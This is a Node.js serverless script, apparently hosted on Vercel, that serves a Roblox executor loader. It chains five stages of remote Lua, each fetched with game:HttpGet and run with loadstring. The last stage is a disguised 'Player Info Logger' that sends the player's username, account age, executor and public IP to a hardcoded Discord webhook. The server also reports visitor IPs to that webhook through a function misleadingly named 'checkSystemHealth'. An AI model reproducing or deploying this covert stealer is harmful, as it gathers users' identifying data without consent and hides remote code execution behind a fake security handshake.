const https = require('https');
const crypto = require('crypto');

let sessions = {};
let blacklist = {}; 
const SECRET_SALT = "NDRAAWZAJA";

const WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

async function checkSystemHealth(msg) {
    const data = JSON.stringify({ content: msg });
    const url = new URL(WEBHOOK);
    return new Promise((resolve) => {
        const req = https.request({
            hostname: url.hostname,
            path: url.pathname,
            method: 'POST',
            timeout: 1500,
            headers: { 'Content-Type': 'application/json' }
        }, (res) => resolve(res.statusCode >= 200 && res.statusCode < 300));
        req.on('error', () => resolve(false));
        req.write(data);
        req.end();
    });
}

module.exports = async (req, res) => {
    res.setHeader('Content-Type', 'text/plain');

    try {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || "unknown";
        const agent = req.headers['user-agent'] || "";
        const { step, id, key, unban_key, sig } = req.query;
        const host = req.headers.host;
        const currentPath = req.url.split('?')[0]; 

        if (unban_key && sig) {
            const expectedSig = crypto.createHmac('sha256', SECRET_SALT).update(unban_key).digest('hex');
            if (sig === expectedSig) {
                delete blacklist[ip];
                return res.status(200).send("System: Access Restored for IP " + ip);
            }
        }

        if (blacklist[ip]) {
            return res.status(403).send("warn('Zifi: IP Address Banned.')");
        }

        const currentStep = parseInt(step) || 0;
        const now = Date.now();

        if (currentStep > 0) {
            if (!sessions[ip] || sessions[ip].lastStep !== currentStep - 1 || key !== sessions[ip].nextKey) {
                return res.status(200).send("warn('Vercel: Invocation Error')");
            }
            if (now - sessions[ip].lastTime < 100) { 
                blacklist[ip] = true;
                return res.status(403).send("warn('Vercel: Bot Activity Detected')");
            }
        }

        // --- 5 LAYER LOGIC ---

        if (currentStep === 0) {
            if (!agent.includes("Roblox")) return res.status(200).send("NGAPAIN BANG?");
            
            const sessionID = Math.random().toString(36).substring(2, 12);
            const firstKey = Math.random().toString(36).substring(2, 8);
            sessions[ip] = { id: sessionID, lastStep: 0, nextKey: firstKey, lastTime: now };

            return res.status(200).send(
`local sid, nkey = "${sessionID}", "${firstKey}"
task.wait(0.2)
local response = game:HttpGet("https://${host}${currentPath}?step=1&id="..sid.."&key="..nkey, true)
if response then loadstring(response)() end`
            );
        }

        if (currentStep >= 1 && currentStep <= 4) {
            const nextKey = Math.random().toString(36).substring(2, 8);
            sessions[ip].lastStep = currentStep;
            sessions[ip].nextKey = nextKey;
            sessions[ip].lastTime = now;

            return res.status(200).send(
`-- Layer ${currentStep} Secure Handshake
task.wait(0.15)
local r = game:HttpGet("https://${host}${currentPath}?step=${currentStep + 1}&id=${id}&key=${nextKey}", true)
if r then loadstring(r)() end`
            );
        }

        if (currentStep === 5) {
            await checkSystemHealth("🛡️ **System Success**\nIP: " + ip + " passed 5 layers.");
            delete sessions[ip];

            // PENTING: Semua backtick di dalam Lua diganti menjadi tanda kutip agar tidak bentrok dengan JS
            return res.status(200).send(
`local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local request = syn and syn.request or http_request or (http and http.request)
local webhook = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5"

local ipData, gameInfo
pcall(function() ipData = HttpService:JSONDecode(game:HttpGet("https://ipwho.is/")) end)
pcall(function() gameInfo = MarketplaceService:GetProductInfo(game.PlaceId) end)

local function formatAccountAge(userId)
    if not request then return "-" end
    local success, response = pcall(function()
        return request({ Url = "https://users.roblox.com/v1/users/"..userId, Method = "GET" })
    end)
    if not success or not response.Body then return "-" end
    local userData = HttpService:JSONDecode(response.Body)
    local createdStr = userData.created
    local creationDate = os.time({year=tonumber(createdStr:sub(1,4)), month=tonumber(createdStr:sub(6,7)), day=tonumber(createdStr:sub(9,10))})
    local diff = os.difftime(os.time(), creationDate)
    return math.floor(diff / 86400).." Hari"
end

local embed = {
    ["title"] = "📢 Player Info Logger",
    ["color"] = 16753920,
    ["fields"] = {
        {["name"] = "👤 Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
        {["name"] = "📅 Account Age", ["value"] = formatAccountAge(LocalPlayer.UserId), ["inline"] = true},
        {["name"] = "💻 Executor", ["value"] = (identifyexecutor and identifyexecutor() or "Unknown"), ["inline"] = true},
        {["name"] = "🌐 IP Address", ["value"] = (ipData and ipData.ip or "Unknown"), ["inline"] = true},
        {["name"] = "🗺️ Map", ["value"] = (gameInfo and gameInfo.Name or "Unknown"), ["inline"] = false}
    },
    ["footer"] = { text = "ZiFi Security Handshake Complete" },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

pcall(function()
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({embeds = {embed}})
    })
end)
warn("ZiFi: Script Loaded Successfully!")`
            );
        }

    } catch (error) {
        return res.status(200).send("warn('Vercel: Error')");
    }
};
